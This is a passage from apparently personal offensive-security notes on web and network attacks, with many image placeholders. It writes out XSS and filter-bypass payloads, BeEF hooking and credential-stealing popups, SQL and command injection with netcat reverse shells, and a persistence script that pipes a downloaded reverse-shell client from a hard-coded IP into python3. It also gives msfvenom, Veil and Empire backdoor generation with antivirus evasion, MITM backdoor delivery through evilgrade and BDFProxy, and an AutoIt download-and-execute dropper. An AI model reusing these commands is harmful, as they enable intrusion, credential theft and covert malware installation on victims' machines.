The script could then do malicious things like steal a victims cookies
and have access to a log in to a website.

![Diagram Description automatically
generated](media/image320.png){width="6.5in"
height="3.1791666666666667in"}

![Graphical user interface, text, application Description automatically
generated](media/image321.png){width="5.740840988626422in"
height="3.219409448818898in"}

###### Discovery vulnerability with HTML Injection

Being able to inject html into a form field for example and watch it
dsplay on screen somewhere is itself a good sign of more potential
vulnerability and can be it's own vulnerability altogether.

**Why HTML injection is so dangerous!**

Being able to inject something like this can cause a redirect to a
malicious site

![](media/image322.png){width="6.5in" height="0.2652777777777778in"}

This is super dangerous for spoofing a site with a bad clones instance.

####### HTML Injection: Bypassing pre tags

Upon inputting values, your input may be surrounded with "pre" tags to
ensure HTML isn't rendered.

![Text Description automatically
generated](media/image323.png){width="6.5in"
height="1.3763888888888889in"}

You can escape this my prefixing your input with "\</pre\>" -- for
example per above) \</pre\>\<h1\>TEST\</h1\>

###### Reflective xss

![Text Description automatically
generated](media/image324.png){width="6.5in"
height="1.6847222222222222in"}

HTML injection can usually be turned into reflective xss as js is
usually appended to the query parameters when JS is injection into and
input field for example.

![](media/image325.png){width="6.5in" height="0.34791666666666665in"}

This means someone can send this link to victims using your domain and
have their own js execute when a victim loads the link. With this one
can modify the link to write malicious code (say, to grab a cookies).

**Discovering in an link tag**

If you modify href, you can make it href=javascript:alert(0)

**Doscovering in an image**

![Graphical user interface, text, application, chat or text message
Description automatically generated](media/image326.png){width="6.5in"
height="1.2340277777777777in"}

![Background pattern Description automatically
generated](media/image327.png){width="6.5in" height="0.86875in"}

![Background pattern Description automatically
generated](media/image328.png){width="6.5in"
height="0.8395833333333333in"}

![A screenshot of a computer Description automatically generated with
low confidence](media/image329.png){width="6.5in"
height="2.3826388888888888in"}

**Another...**

###### Stored xss

![Text Description automatically generated with medium
confidence](media/image330.png){width="6.5in"
height="1.3277777777777777in"}

This involves ones being able to inject HTML/JS into a field somehere
where data is usually saved (say, a comment, post, etc) and after
loading the page (post/comment/etc) being able to see the effects of
your injected code.

For example, if you add a comment with a \<b\> tag and you see your
commend as bold when loading the page -- then this means that the text
was saved in the db with your injected html! You can further use this to
inject JS and see if JS loads (like an alert) when loading the page. If
so, this means the JS is being stored in the db and when someone loads
your post/comment/etc your JS can be loaded. With this you never have to
send a direct link to someone -- you can just wait for you post to be
loaded.

![Graphical user interface, text Description automatically
generated](media/image331.png){width="4.334811898512686in"
height="1.4177766841644794in"}

###### DOM based xxs

![Text Description automatically
generated](media/image332.png){width="6.5in"
height="2.1534722222222222in"}

![A picture containing text Description automatically
generated](media/image333.png){width="4.421081583552056in"
height="2.7872648731408574in"}

###### XSS injection techniques

####### Owasp Cheat Sheet!

<https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html>

<https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/>

**Use HTML entity instead of actual characters**

![Graphical user interface, text Description automatically
generated](media/image334.png){width="6.5in"
height="1.6972222222222222in"}

####### Look for multiple places where your test data might be injected

![](media/image335.png){width="6.5in" height="0.4513888888888889in"}

####### Query parameter Injection 

Any time you see a url that ends in an equal sign you know there is room
to pass something in

![](media/image336.png){width="3.936062992125984in"
height="0.1795614610673666in"}

####### Charcode instead of text

<https://www.browserling.com/tools/text-to-ascii>

<https://charcode98.neocities.org/>

(just google a charchode calculator)

Use charcodes instead of actual text

![Graphical user interface, application Description automatically
generated with medium
confidence](media/image337.png){width="5.573694225721785in"
height="0.718850612423447in"}

Paste the charchode in a JS method

![](media/image338.png){width="6.5in" height="0.20902777777777778in"}

**Example**

![Graphical user interface, text, application, chat or text message
Description automatically generated](media/image339.png){width="6.5in"
height="0.9625in"}

![](media/image340.png){width="5.532022090988627in"
height="0.46881561679790024in"}

Gotta add commas though. Good to test breaking client-side filtering.

####### XSS based on technology type

Using tools like wappalizer to see the technologies used by a websites.

You can try injection based on technology type

**Example**: JS template literals

![Text Description automatically generated with medium
confidence](media/image341.png){width="6.5in" height="1.26875in"}

**Example**: Angular JS

![](media/image342.png){width="6.5in" height="0.7972222222222223in"}

####### Bypass single-quote filtering

Trying to inject ';alert(22);//

![](media/image343.png){width="6.5in" height="0.50625in"}

and getting this injected...

![](media/image344.png){width="5.573694225721785in"
height="0.552159886264217in"}

\^ looks like the dev is escaping our single quotes... time to
double-down and escape their escape.

![Background pattern Description automatically
generated](media/image345.png){width="6.034884076990376in"
height="0.8680555555555556in"}

####### Bypass multi-quote filtering

If you single-quote escapes are being further ecaped by the dev try
another approach to use a single quote like the html entity

![](media/image346.png){width="6.5in" height="0.7493055555555556in"}

![Graphical user interface, text, application Description automatically
generated](media/image347.png){width="6.5in"
height="1.8055555555555556in"}

####### Bypass case-sensitive filters

Perhaps there's some filtering but it's not case-insensitive. Changing
the case might be enough to inject

![](media/image348.png){width="6.5in" height="0.7416666666666667in"}

####### Bypass WAFs that filter ALL html tags

Try using fake tags and using the HTML attributes (like onhover to
inject )

![](media/image349.png){width="6.5in" height="0.7680555555555556in"}

 ![Graphical user interface, text, application Description automatically
generated](media/image350.png){width="3.9572386264216974in"
height="1.1306397637795276in"}

Becomes...

![Graphical user interface, text, application, chat or text message
Description automatically generated](media/image351.png){width="6.5in"
height="1.0666666666666667in"}

![](media/image352.png){width="6.5in" height="0.5506944444444445in"}

**Intruder for HTML injection**

Also, try the Burp Suite Intruder with a payload of HTML tags from a
cheat sheet. Often times some tags aren't blocked -- you just have to
find which ones. (see intruder section).

![Graphical user interface, application, Teams Description automatically
generated](media/image353.png){width="6.5in"
height="1.2104166666666667in"}

Further, once you find a vulnerable tag, you can proceed to use the
intruder on the working tag and drop a payload of attributes on that
same weak tag

![Graphical user interface, text, application Description automatically
generated](media/image354.png){width="3.9812937445319334in"
height="1.0395603674540683in"}

 ![Graphical user interface, text Description automatically
generated](media/image355.png){width="6.5in"
height="3.8333333333333335in"}

####### Bypassing CSP

![](media/image356.png){width="6.5in" height="0.7222222222222222in"}

\^ that prevents inline JS

If you can override this -- try setting to...

![](media/image357.png){width="4.569972659667542in"
height="0.3417716535433071in"}

This will override the secure behavior.

####### Injection via href

![](media/image358.png){width="6.5in" height="0.7041666666666667in"}

####### Indirect injection

If you can't directly inject JS into the webpage/DOM Element -- try
injecting by closing that element and injecting what you can after that
element.

![A picture containing text Description automatically
generated](media/image359.png){width="6.5in"
height="3.2645833333333334in"}

###### XSS Exploitation 

####### Sending malicious linke with xss injected in the query string

####### Toxssin

<https://github.com/t3l3machus/toxssin>

####### Site redirection

In images

\<img src=\"http://url.to.file.which/not.exist\"
onerror=window.open(\"https://www.google.com\",\"xss\",\'height=500,width=500\');\>

If you're injecting a script tag you can try **onload**.

If you're injection html/DOM data you can use **onmouseover** or more.

####### Hooking victims using BeeF

![Graphical user interface, text Description automatically generated
with medium confidence](media/image360.png){width="6.5in"
height="2.5166666666666666in"}

######## Initial Setup

Usually user/pass are both "beef".

Once you start BeeF from the GUI in kali -- you'll see a command prompt
-- showing you what you need to inject to hook a victim:

![Text Description automatically
generated](media/image361.png){width="5.521604330708661in"
height="1.166829615048119in"}

\^ this should be replaced with the hackers ip

![Graphical user interface, text Description automatically
generated](media/image362.png){width="6.5in"
height="5.2444444444444445in"}

In the BeeF Web UI you can see any visible users.

![Graphical user interface, text, application, email Description
automatically generated](media/image363.png){width="5.302823709536308in"
height="4.781917104111986in"}

######## Hooking a victim..

**Using reflected XSS** you can send a victim an exploited link

![](media/image364.png){width="6.5in" height="0.5375in"}

\^ you can use a link shortener to make it less suspicious.

**Using stored xss** you can just inject the url as a regular
post/comment, etc

![Graphical user interface, text, application, email Description
automatically generated](media/image365.png){width="6.459234470691164in"
height="1.791917104111986in"}

**Using ARP Spoofing with Bettercap to inject the beef hook**

<https://www.udemy.com/course/learn-ethical-hacking-from-scratch/learn/lecture/5369646#content>

Save the following into a JS file

*var* imported = document.createElement(\'script\');

imported.src = \'http://YourIP:3000/hook.js\';

document.head.appendChild(imported);

Like so:

![](media/image366.emf)

Then inject this payload into the hstshijack caplet

nano /usr/local/share/bettercap/caplets/hstshijack.cap

Add in the payload section...

payloads \*:/root/inject_beef.js

Start bettercap

bettercap -iface eth0 -caplet spoof.cap

Start hstshijack caplet to spoof and inject js

hstshijack/hstshijack

######## Running commands on victims

![Graphical user interface, application Description automatically
generated](media/image367.png){width="3.323380358705162in"
height="4.625645231846019in"}

**SypderEye** -- used to take screenshots of the victims browser.

**Alert** -- used to send an alert popup.

**Redirect**

![Graphical user interface, application Description automatically
generated](media/image368.png){width="6.5in"
height="0.9590277777777778in"}

**Stealing creds with a fake re-auth popup (pretty theft)**

![Graphical user interface, application Description automatically
generated](media/image369.png){width="6.5in"
height="2.2256944444444446in"}

##### SQL Injection

<https://portswigger.net/web-security/sql-injection>

Another type of injection attack is a **SQL, or S-Q-L, injection
attack**. Unlike an XSS that targets a user, a SQL injection attack
targets the entire website if the website is using a SQL database.
Attackers can potentially run SQL commands that allow them to delete
website data, copy it, and run other malicious commands.

###### Cheat Sheet

<https://portswigger.net/web-security/sql-injection/cheat-sheet>

###### Retrieving hidden data

![Graphical user interface, text, application, email Description
automatically generated](media/image370.png){width="6.5in"
height="4.259027777777778in"}

###### Subverting application logic

![Graphical user interface, text, application, email Description
automatically generated](media/image371.png){width="6.5in"
height="2.5in"}

###### File Upload vulnerability

<https://www.udemy.com/course/learn-website-hacking-penetration-testing-from-scratch/learn/lecture/6019466#overview>

![Text Description automatically
generated](media/image372.png){width="6.5in"
height="2.9305555555555554in"}

**Protection again unrestricted file upload attacks**

<https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload>

**Creating a backdoor via file upload**

(assuming you have two columns being retrieved and you are using PHP)

![](media/image373.png){width="6.5in" height="0.32916666666666666in"}

UNION SELECT '\<?passthru("nc -e /bin/sh \<my_ip\>
\<my_port\>");?\>'null into outfile '/tmp/reverse.php'\>'

The idea would be to get that netcat command on the target machine .

![A picture containing text, device, close, meter Description
automatically generated](media/image374.png){width="3.760941601049869in"
height="0.7501049868766404in"}

![Text Description automatically
generated](media/image375.png){width="6.5in"
height="1.4083333333333334in"}

**"e" switch Requires traditional netcat install**

![Graphical user interface, text, application, email Description
automatically generated](media/image376.png){width="6.094600831146106in"
height="4.146411854768154in"}

###### Examining the database

![Text Description automatically
generated](media/image377.png){width="6.5in"
height="2.111111111111111in"}

###### Blind SQL injection vulnerabilities

<https://portswigger.net/web-security/sql-injection/blind>

![Text Description automatically
generated](media/image378.png){width="6.5in"
height="2.7368055555555557in"}

Only returns "a" (or whatever) of the table exists;

![Text Description automatically
generated](media/image379.png){width="6.5in"
height="1.7027777777777777in"}

Is pass len \> 1

![](media/image380.png){width="6.5in" height="0.6368055555555555in"}

Do for each number untilwe know how long the pass is.

###### Union Attack (Retrieving data from other database tables)

![Graphical user interface, text, application, email Description
automatically generated](media/image381.png){width="6.5in"
height="2.279166666666667in"}

<https://portswigger.net/web-security/sql-injection/union-attacks>

###### Using SQLMap

<https://www.youtube.com/watch?v=2YD4vygeghM>

<https://www.youtube.com/watch?v=IGIA7eSMxs8>

![Text Description automatically
generated](media/image382.png){width="6.5in"
height="2.5027777777777778in"}

![](media/image383.png){width="6.5in" height="0.22847222222222222in"}

\^ helpful to know if a form is injectable.

Alternatively, you can save a login request (say from burp) and
reference that file instead of passing in a url

![](media/image384.png){width="4.8027537182852145in"
height="0.40630686789151355in"}

**Get dbms**

sqlmap -u \<url\> \--dbs

or...

![](media/image385.png){width="5.313241469816273in"
height="0.3125437445319335in"}

**Get current user**

sqlmap -u \<url\> ---current-user

**Get current database**

sqlmap -u \<url\> ---current-db

**Get table names once you have current database name**

sqlmap -u \<url\> ---tables -D \<database_name\>

![Text Description automatically
generated](media/image386.png){width="6.5in"
height="2.3652777777777776in"}

Or...

![](media/image387.png){width="6.5in" height="0.2611111111111111in"}

**Get table columns of current database & table**

sqlmap -u \<url\> ---columns -T \<table_name\> -D \<database_name\>

**Get all contents of a table of current database & table**

sqlmap -u \<url\> -T \<table_name\> -D \<database_name\> \--dump

![Graphical user interface Description automatically generated with
medium confidence](media/image388.png){width="6.5in"
height="5.111805555555556in"}

Or...

![](media/image389.png){width="6.5in" height="0.34444444444444444in"}

**Get access to OS shell**

sqlmap -u \<url\> -T \<table_name\> -D \<database_name\> \--os-shell

**Get access to SQL shell**

sqlmap -u \<url\> -T \<table_name\> -D \<database_name\> \--os-shell

###### Security and mitigation

**Parameter binding** is very important and here's why:

![Text Description automatically
generated](media/image390.png){width="6.5in"
height="1.4736111111111112in"}

##### OS Command Injection

###### Cheat sheets

![](media/image391.emf)

![](media/image392.emf)

###### General usage

<https://hackersonlineclub.com/command-injection-cheatsheet/>

![Text Description automatically
generated](media/image393.png){width="6.5in"
height="1.6055555555555556in"}

**Input**

![Table Description automatically generated with low
confidence](media/image394.png){width="2.9274923447069114in"
height="0.531324365704287in"}

![Text Description automatically
generated](media/image395.png){width="4.761081583552056in"
height="1.4793733595800524in"}

**Request**

![Graphical user interface, text, application, email Description
automatically generated](media/image396.png){width="3.333053368328959in"
height="2.144763779527559in"}

###### Injecting a backdoor with netcat

**Value to input...**

\<input\>; nv -e /bin/sh \<hacker_ip\> \<hacker_port\>

![Graphical user interface, text, application Description automatically
generated](media/image397.png){width="3.34421697287839in"
height="0.8542858705161854in"}

**Hacker's machine -- listening with netcat on same port**

![Text Description automatically
generated](media/image398.png){width="6.5in"
height="0.9409722222222222in"}

**Bypass filtering**

In case there was a check for semicolon, you could instead use a pipe
symbol or && or any other variant.

![Graphical user interface, text Description automatically
generated](media/image399.png){width="6.5in"
height="2.2569444444444446in"}

###### Blind injection

If you aren't able to get the output printing in the response, try blind
injection where you can delay the response with something like the sleep
command. Also good to do on input fields.

![](media/image400.png){width="2.846814304461942in"
height="0.27887139107611547in"}

Note: spaces should be replaced with "+" since valurd nrrd to be
encoded.

###### Blind injection via asynchronous thread

It's possible that a command you inject is indeed running on the target
machine but you don't see the output (blind) and you don't see the
effect from the target machine (example, the sleep command isn't causing
any delays in the response). This could be because the architecture of
the target machine processes the injected command as an asynchronous
task (think node js for example). So the response comes back as usual
even though the command executed on the target machine.

In this case, try running a command like ping or mslookup on the target
machine and ping a server that you own. Then you can check the logs on
your server to see if you are getting a ping hits (icmp packets). Then
you know that the command machine must be executing on the target
machine.

![A picture containing text Description automatically
generated](media/image401.png){width="6.5in"
height="1.9034722222222222in"}

![](media/image402.png){width="6.5in" height="0.27152777777777776in"}

**Advanced -- see output of commands as a subdomain**

![Diagram, text Description automatically
generated](media/image403.png){width="4.6908344269466316in"
height="1.4267957130358706in"}

![](media/image404.png){width="4.4466229221347335in"
height="0.4496587926509186in"}

![](media/image405.png){width="6.5in" height="0.5673611111111111in"}

Logs:

![Application Description automatically generated with low
confidence](media/image406.png){width="4.686114391951006in"
height="1.6161089238845143in"}

### Backdoors and Reverse shells

#### \[Hacker\] Creating a backdoor and listening for connections

##### Create a backdoor with python

Server script to listen + Client script to connect

<https://github.com/bobby-valenzuela/ReverseShell>

========== BELOW IS LEGACY DOCUMENTATION -- SCRIPT HAS BEEN REVISED --
SEE REPO ===================

**Terminal 1:** Start server script to listen for connections

![Text Description automatically
generated](media/image407.png){width="6.042509842519685in"
height="1.802334864391951in"}

**Terminal2:** Start webserver (python here) to host payload (client
script)

![Text Description automatically
generated](media/image408.png){width="6.5in"
height="1.3729166666666666in"}

Hard-code client script with hacker ip (to connect to).

**Deploy**: Get client to run a wget to execute the script

![Text Description automatically
generated](media/image409.png){width="6.5in"
height="2.2743055555555554in"}

**InfiniteShell**

Use a current connection to download another file... the infinite shell.
This file just keeps calling the reverseshell if it loses connection.

Once downloaded -- run infinite shell in a secret location under a
non-suspicious name and in the bg as so

nohup bash infiniteShell.sh &\> /dev/null &

**[Script]{.underline}**

#!/usr/bin/env bash

while :

do

\# CHeck if we have netstat/ss installed - see if we have a tcp
connection to our CNC server

if netstat \--version &\> /dev/null

then

tcp_con=\$(netstat -tupn \| grep ESTABLISHED \| egrep
\'96.126.97.119:8000\' \| awk \'{ print \$1 }\' \| xargs)

else

tcp_con=\$(ss -tupn \| grep ESTAB \| egrep \'96.126.97.119:8000\' \| awk
\'{ print \$1 }\' \| xargs)

fi

\# If we don\'t have a connection - start another

\[\[ ! \"\${tcp_con}\" =\~ tcp \]\] && wget -O -
96.126.97.119:8080/reverseShellClient.py \| python3

sleep 60 \# run every minute

done

##### Creating a backdoor with msfvenom

**Optional: Create new dir**

mkdir \~/Desktop/Malware && cd \~/Desktop/Malware

**Generate Malicious Implant**

sudo msfvenom -a \<architecture\> \--platform \<linux\|windows\> -p
\<payload_type\> LHOST\<kali_ip\> LPORT=\<kali_port\> \--smallest -i 4
-f \<exe\|elf\> -o \<payload_name\>

**\--smallest**: Means, smallest possible size of payload.

**-i 4**: helps avoid antivirus detection.

**-p**: Payload must match the payload of the generated payload.

*Working example:*

sudo msfvenom -a x86 \--platform linux -p
linux/x86/meterpreter/reverse_tcp LHOST\<kali_ip\> LPORT=443 \--smallest
-i 4 -f elf -o malicious

All the client has to do is execute this executable in the background
and a connection will be established.

##### Creating a backdoor with veil

![Text Description automatically
generated](media/image410.png){width="6.5in"
height="2.734722222222222in"}

###### Install veil

<https://github.com/Veil-Framework/Veil>

**Latest tar-gz:**

wget
<https://github.com/Veil-Framework/Veil/archive/refs/tags/3.1.14.tar.gz>

![Text Description automatically
generated](media/image411.png){width="6.167527340332459in"
height="1.3022648731408575in"}

Once installed just run with **veil**.

![Text Description automatically
generated](media/image412.png){width="6.5in" height="1.63125in"}

Checking out the "use" option you can see that veil has two tools

![Graphical user interface, text, application Description automatically
generated](media/image413.png){width="3.27128937007874in"
height="1.1251574803149607in"}

**Evasion**: Facilitates the implementation Backdoors.

**Ordnance**: Generates the actual payload use in the ***Evasion***
tool.

###### Viewing existing payloads 

![Graphical user interface, text Description automatically generated
with medium confidence](media/image414.png){width="2.4945516185476815in"
height="1.3444160104986878in"}

**[Using Evasion]{.underline}**

Using the evasion tool and selecting the "list" command will list the
available payloads:

Payload output is structured as follows (general naming pattern):

program/script language/ type of code to be executed / method

"meterpreter" allows for full control of a system and has a very light
footprint.

**Method**: for example "rev_tcp.py" means a "reverse tcp connection"
"Reverse" meaning the hackers isn't connecting to the victim machine.
Instead, the victim's system connects to the hackers machine. Great as
this bypasses antivirus -- especially if using an http port as this
looks like the client is just browsing the web.

![Text Description automatically
generated](media/image415.png){width="4.687174103237095in"
height="5.266560586176728in"}

###### Generating a backdoor

Use the **options** command update your backdoor configuration.

Most important option is the LHOST option where you can specify the
hackers IP -- where the backdoor will connect back to (can use local ip
if running as same machine).

![Graphical user interface, text Description automatically
generated](media/image416.png){width="6.5in" height="1.4375in"}

set LHOST \<ip\>

![Text Description automatically
generated](media/image417.png){width="4.820797244094488in"
height="1.5774234470691164in"}

If your hacking machine is already serving up content on port 80 then
you can change the port to 8080 as websites also use this and it
shouldn't cause issues in the client firewall. This means you should
receive a connection attempt from the victimi machine back to your
hacking machine on port 8080 -- on which you should be listening.

![](media/image418.png){width="2.1252963692038493in"
height="0.39588910761154855in"}

Run the options command again to view your changes.

**2^nd^-Order payload signature scrambling**

AntiVirus compares the signature of a given payload with signatures of
payloads of known virus (by scanning an internal database). Although
veil does a bit of signature scrambling we can add some additional
randomness to further alter the signature. This is also why its
important to use the latest version of veil.

One way to do this is by changing the number of processors (to a small
non-zero number) and the sleep option (to add in a small delay before
the backdoor should execute):

![Timeline Description automatically
generated](media/image419.png){width="6.5in"
height="3.3826388888888888in"}

Select **generate** when you are ready to generate your backdoor.

After choosing a name you'll see modules in use and where your backdoor
is stored:

![Text Description automatically
generated](media/image420.png){width="6.5in"
height="1.9729166666666667in"}

![Graphical user interface, application Description automatically
generated](media/image421.png){width="2.8185837707786527in"
height="1.307509842519685in"}

#### \[Hacker\] Listening for incoming connections with metasploit

![Text Description automatically
generated](media/image422.png){width="6.5in"
height="3.463888888888889in"}

sudo apt install metasploit-framework -y

<https://www.youtube.com/playlist?list=PLBf0hzazHTGN31ZPTzBbk70bohTYT7HSm>

<https://www.udemy.com/course/learn-ethical-hacking-from-scratch/learn/lecture/5306526#content>

<https://www.udemy.com/course/learn-website-hacking-penetration-testing-from-scratch/learn/lecture/7282298#search>

Meterpreter was actually designed by the same people who made Metasploit
(and Veil uses meterpreter).

So it's best to use Metasploit to listen to connections from your
meterpreter-based backdoor.

navigate to **/usr/share/Metasploit-framework** too see all framework
details.

Commands:
<https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/>

**Start metasploit framework with**

sudo msfconsole -q

**Select module to use**

use exploit/mutli/handler

\^ this module is used for generating backdoors and listening to
incoming connections.

![Text Description automatically
generated](media/image423.png){width="6.5in"
height="3.8715277777777777in"}

From here run show options to see the options for this module.

Make sure the payload set matches the one you have deployed in the
backdoor:

![Text Description automatically
generated](media/image424.png){width="6.5in"
height="3.182638888888889in"}

If not let's change it: set PAYLOAD \<payloadname\>

![](media/image425.png){width="6.5in" height="0.2125in"}

*Linux example*

set PAYLOAD linux/x86/meterpreter/reverse/tcp

Run show options again to confirm those changes have taken effect.

Confirm all other options match what you've deployed in your backdoor
and change as need (LHOST, LPORT, etc).

-   set LHOST \<hacker IP\>

-   set LPORT \<hacker port\>

    -   *Best to use a non suspicious port like 443 or 8080*

Run exploit command to begin listening:

![](media/image426.png){width="6.5in" height="0.7694444444444445in"}

Once a victim runs your exploit you will see a connection like so:

![](media/image427.png){width="6.5in" height="0.7465277777777778in"}

This means you're now in a meterpreter session.

Run sysinfo to get information about the connected machine

![A picture containing text Description automatically
generated](media/image428.png){width="5.615367454068242in"
height="2.156550743657043in"}

#### \[Hacker\] Check if the payload is detected by any antivirus programs

Some services that check this actually sell the payload signature to
anti-viruses (which defeats the purpose -- need to find a good provider
here). Don't use "VirusTotal" as they upload signatures.

**Using nodistribute**: <https://nodistribute.com/>

**Using Spyralscanner:** <https://spyralscanner.net/>

**Using Empire**:
<https://zsecurity.org/bypassing-anti-virtus-hacking-windows-10-using-empire/>

*Text below from link above \^*

Most of us have heard of msfvenom or or at least metasploit backdoors,
they're great but they get detected by anti-virus programs, we also know
we can use a tool
called [Veil-Evasion](https://www.youtube.com/watch?v=wrqexzfPuK8) to
generate backdoors that bypass most anti-virus programs, the
effectiveness of such tools depends on how recently they
were **updated**, therefore sometimes Veil will generate backdoors that
will get detected by several AV programs, the way to fix this is to
modify the backdoor manually to make it more unique (this is a
completely different topic, [I actually cover that in my social
engineering
course](https://zsecurity.org/courses/learn-social-engineering-from-scratch/?coupon=youtube-se)),
alternatively you can just try to generate the backdoor using another
tool, such as Empire.

Empire does not come pre-installed in Kali, follow these simple steps to
install it:

1.  Go to the /opt directory (optional).

cd /opt

 

2\. Clone the project from github.

git clone https://github.com/EmpireProject/Empire.git

 

3\. Navigate to its setup directory

cd Empire/setup

 

4\. Run the installer

./install.sh

 

Wait for the installer to finish, and then you can run the tool from its
directory in /opt/Empire, so first you'll have to navigate to it using
cd

cd /opt/Empire

 

Then run it

./empire

And that should start the tool for you, so you should see something like
this

![Text Description automatically
generated](media/image429.png){width="6.5in"
height="4.491666666666666in"}

 

Now you're ready to use the tool, checkout the following video to learn
how to use the tool in general, as an example you will learn how to
generate a windows backdoor that bypass anti-virus programs and use this
backdoor to hack Windows 10.

**Linked video:** <https://youtu.be/a2NYnp7Az7k>

#### \[Hacker\] Host Payload with Apache2/Python as a simple web server

**[USING PYTHON]{.underline}**

You can serve up payloads/etc from your hacking machine by creating a
simple server as so:

**\[HOST\] Start server**

python3 -m http.server 8080

This will serve up files from the directory in which the command was
called.

**[USING APACHE]{.underline}**

Kali also comes preinstalled with apache.

You can just start apache with sudo systemctl start apache2

Then drop the payload in /var/www/html

#### \[Client\] Deploying a backdoor/reverse shell

##### Using evil grade (system update feature)

<https://www.udemy.com/course/learn-ethical-hacking-from-scratch/learn/lecture/5334424#overview>

![Graphical user interface, text Description automatically
generated](media/image430.png){width="6.5in"
height="3.3756944444444446in"}

###### Installing evilgrade

<https://github.com/infobyte/evilgrade>

The latest version of evilgrade does not work properly, so :

1\. Download Evilgrade.zip from the resources of this lecture.

2\. Go to the downloads and boule click evilgrade.zip to uncompress it.

3\. Open a terminal and run the following commands (needs some perl
modules):

cd /root/Downloads/evilgrade/

cpan Data::Dump

cpan Digest::MD5

cpan Time::HiRes

cpan RPC::XML

cp -r isrcore /etc/perl

Now the tool will work, it might display an error about Gnu.pm

this is a known bug with evil-grade, if its annoying you

the you can get rid of it using the by removing that lib using the
following command

apt-get remove libterm-readline-gnu-perl

Just make sure you re-install it after you\'re done in case it is needed
by other tools

apt-get install libterm-readline-gnu-perl

###### Configuring and running evilgrade

**Start evilgrade**

cd /opt/evilgrade

./evilgrade

**View modules**

show modules

We need to use the dap (download accelerator plus) module.

**Configure a module**

configure \<module\>

configure dap

**Show modules options**

show options

**Change the agent**

![Graphical user interface Description automatically
generated](media/image431.png){width="6.5in"
height="2.3340277777777776in"}

\^ currently it's set to ./agent/agent.exe

We need to change it to where our backdoor is located on our machine.

set agent \<backdoorpath\>

set agent /usr/share/veil-output/complied/rev_https_8080.exe

**Change the endsite (page that loads when backdoor is successfully
deployed)**

set endsite \<page\>

set endsite www.speedbit.com

**Verify changes and start eveilgrade**

show options

start

At this point -- if evilgrade gets a request for a system update (from
some client machine) -- it will say yes and respond with the backdoor.

###### Set up MIM to route system update checks to evilgrade 

At this point...

-   **Terminal 1**: Veil listening for connections from backdoor.

-   **Terminal 2**: Evilgrade waiting for connections for system update.

-   **Terminal 3**: (now) Bettercap MIM on victim and DNS Spoofing to
    send update requests to evilgrade.

Probably best to use bettercap to initiate the MIM

bettercap -face \<interface\> -caplet spoof_caplet.cap

We next want to spoof dns so that the server to check for updates will
be the url that evilgrade uses (update.speedbit.com).

**DNS Spoofing with bettercap**

set dns.spoof.all true

set dns.spoof.domains update.speedbit.com

dns.spoof on

##### Using bdfproxy (exe downloads)

![](media/image432.png){width="6.5in" height="3.4819444444444443in"}

<https://www.kali.org/tools/backdoor-factory/>

**Install**: sudo apt install backdoor-factory

BDF listens for any exes being downloaded and responds with a backdoor
instead.

###### Terminal 1 : BDFProxy

**Edit config file (/opt/BDFProxy)**

-   Change **proxyMode** from "regular" to "transparent".

-   Under \[targets\] change HOST for windows/linux to match your
    attacker IP.

    -   Keep port as 8080 -- we will need this later.

**Run BDFProxy**

![Text Description automatically
generated](media/image433.png){width="6.5in"
height="1.6041666666666667in"}

###### Terminal 2: Arp spoof with bettercap

bettercap -iface eth0 -caplet spoof.cap

###### Terminal 3: Update firewall && Listen for connections

Using iptables here -- but basically we want update the "nat" table and
append (A) a new rules that will re-route any packets destined for port
80 and redirect them to port 8080.

*Run as root*

iptables -t nat -A PREROUTING -p tcp --destination 80 -j REDIRECT
--to-port 8080

**Listen to incoming connections**

At this point you can listen to connections using by starting the
Metasploit console with msfconsole and running use exploit/multi/handler
(as described earlier)

Or

Use the "resource file" (rc) that BDFproxy offers

![Text Description automatically generated with low
confidence](media/image434.png){width="6.5in"
height="1.5194444444444444in"}

Run with Metasploit and add the full path to the resource file you're
using

msfconsole --resource /opt/BDFProxy/bdfprroxy_msf_resource.rc

![Text Description automatically
generated](media/image435.png){width="6.5in"
height="1.0287215660542433in"}

To check/interact for connections within metasploit

**List sessions**: sessions -l

**Interact with session**: sessions -I \<session_id\>

##### Disguising payload as media content

Pt1:
<https://www.udemy.com/course/learn-ethical-hacking-from-scratch/learn/lecture/7065194#content>

Pt2:
<https://www.udemy.com/course/learn-ethical-hacking-from-scratch/learn/lecture/7065196#content>

*More parts follow...*

Written in a scripting language called "autoit"

**=== CODE ===**

#include \<StaticConstants.au3\>

#include \<WindowsConstants.au3\>

Local \$urls = \"url1,url2\"

Local \$urlsArray = StringSplit(\$urls, \",\", 2 )

For \$url In \$urlsArray

\$sFile = \_DownloadFile(\$url)

shellExecute(\$sFile)

Next

Func \_DownloadFile(\$sURL)

Local \$hDownload, \$sFile

\$sFile = StringRegExpReplace(\$sURL, \"\^.\*/\", \"\")

\$sDirectory = \@TempDir & \$sFile

\$hDownload = InetGet(\$sURL, \$sDirectory, 17, 1)

InetClose(\$hDownload)

Return \$sDirectory

EndFunc ;==\>\_GetURLImage

**=== END CODE ===**

##### Deploying a payload via BeEF

Ideal to use the "Fake notification" module as it looks legit

![](media/image436.png){width="4.823590332458442in"
height="0.41672462817147854in"}

![Graphical user interface, text, application, Word Description
automatically generated](media/image437.png){width="6.5in"
height="1.8166666666666667in"}

##### File upload vulnerability

[See bookmark](#file-upload-vulnerabilities)

##### Wget to Downloading/Execute malicious payloads on a client machine

**If you have access to command line of victim -- either directly or
indirectly (though cmd line injection dor example) you can send one
command that allows you to deploy a backdoor.**

Contents of a file can be piped to a program to be executed.

echo \"print(\'hey\')\" \| python3

Combine this with wget and you can redirect the script contents to the
program itself and execute upon download.

**\[CLIENT\] Download files with wget**

Client machines can download as so

wget \<ip\>:\<host\>/\<relative_file_path\>

You can even pipe this to a program to execute right away (file will not
download):

wget -O - \<ip\>:\<host\>/\<relative_file_path\> \| bash

\^ the " -O -- " bit causes wget to read the file and output it as a
readable stream

Add 'q' to run quietly

wget -O - \<ip\>:\<host\>/\<relative_file_path\> \| bash

**Other examples:**

wget -O - \<host:port/payload.py\> \| python3

wget -O - \<host:port/payload.sh\> \| bash

wget -O - \<host:port/payload.pl\> \| perl

#### \[Hacker\] Managing a backdoor connection with meterpreter (Metasploit)

<https://www.udemy.com/course/learn-ethical-hacking-from-scratch/learn/lecture/5308698#content>

![Text Description automatically
generated](media/image438.png){width="6.5in"
height="3.2368055555555557in"}

![Text Description automatically
generated](media/image439.png){width="6.5in"
height="2.645138888888889in"}

![Graphical user interface, text, application Description automatically
